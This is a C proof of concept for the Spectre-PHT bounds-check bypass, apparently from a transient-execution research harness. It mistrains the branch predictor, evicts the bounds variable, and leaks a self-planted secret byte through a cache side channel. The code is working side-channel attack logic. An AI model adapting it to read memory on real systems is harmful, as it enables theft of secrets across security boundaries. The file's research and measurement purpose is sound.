#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// PHT sa-ip: bounds check bypass via speculative execution
// Train branch predictor with in-bounds access, then attack with OOB index

#define BENIGN_SIZE PAGE_SIZE

volatile int buf_size = BENIGN_SIZE;

uint8_t* probe_array;

struct evset_pages {
    uint8_t page_barrier1[PAGE_SIZE];
    uint8_t victim[PAGE_SIZE];
    uint8_t page_barrier2[PAGE_SIZE];
    uint8_t secret_data[PAGE_SIZE];
    uint8_t page_barrier3[PAGE_SIZE];
} __attribute__((aligned(PAGE_SIZE))) evset_pages;

uint8_t *const page_barrier1 = evset_pages.page_barrier1;
uint8_t *const victim        = evset_pages.victim;
uint8_t *const page_barrier2 = evset_pages.page_barrier2;
uint8_t *const secret_data   = evset_pages.secret_data;
uint8_t *const page_barrier3 = evset_pages.page_barrier3;

// Speculative bounds check bypass victim
void __attribute__((noinline)) victim_function(int idx) {
    if (idx >= 0 && idx < STALL(buf_size)) {
        SPEC_FENCE();
        maccess(probe_array + victim[idx] * PAGE_SIZE);
    }
}

typedef struct {
    int secret_offset;
    int training_x;
#ifdef CACHEUTILS_USE_EVICTION
    eviction_set_t buf_size_set;
#endif
} pht_sa_ip_data_t;

void pht_sa_ip_setup(exploit_ctx_t* ctx, void* data) {
    pht_sa_ip_data_t* pht_data = (pht_sa_ip_data_t*)data;

    // Initialize memory
    memset(victim, 0x01, PAGE_SIZE);
    memset(page_barrier1, 0x01, PAGE_SIZE);
    memset(page_barrier2, 0x01, PAGE_SIZE);
    memset(page_barrier3, 0x01, PAGE_SIZE);
    memset(secret_data, 0xFF, PAGE_SIZE);

    ctx->exclude_enabled = true;
    ctx->exclude_value = 0x01 ;  // Exclude secret_data value from stats (gets architectural caching)

    // Calculate secret offset
    pht_data->secret_offset = secret_data - victim;
    pht_data->training_x = 0;  // Constant in-bounds access is sufficient

#ifdef CACHEUTILS_USE_EVICTION
    // Build eviction set for buf_size variable
    if (build_eviction_set_vaddr((void*)&buf_size, &pht_data->buf_size_set) != 0) {
        fprintf(stderr, "Failed to build eviction set for buf_size\n");
        exit(1);
    }
    printf("buf_size eviction set: %d addresses\n", pht_data->buf_size_set.num_addrs);
#endif
}

void pht_sa_ip_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    pht_sa_ip_data_t* pht_data = (pht_sa_ip_data_t*)data;

    // Update secret data with encode index
    secret_data[0] = encode_index;

    //interleaved pattern
    for (int j = 0; j < 60; j++) {
        // Arithmetic masking: j%20<19 -> training_x, j%20==19 -> malicious_x
        int mask = ~((j % 20) - 19) & ~0xFFFF;
        mask = (mask | (mask >> 16));
        int x = pht_data->training_x ^ (mask & (pht_data->secret_offset ^ pht_data->training_x));

#ifdef CACHEUTILS_USE_EVICTION
        evict_with_set(&pht_data->buf_size_set);
#else
        flush((void*)&buf_size);
#endif
        mfence();

        victim_function(x);
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    pht_sa_ip_data_t pht_data = {0};

    // Initialize framework
    if (exploit_init(&ctx) != 0) {
        return 1;
    }

    // Use variant-specific probe array
    probe_array = ctx.probe_array;

    printf("Spectre-PHT sa-ip\n");

    // Setup hooks
    exploit_hooks_t hooks = {
        .setup = pht_sa_ip_setup,
        .attack = pht_sa_ip_attack,
        .cleanup = NULL
    };

    // Run measurement loop
    exploit_run(&ctx, &hooks, &pht_data);

    // Print results
    exploit_print_results("PHT same-address in-place", &ctx);

    // Cleanup
    exploit_cleanup(&ctx);
    return 0;
}
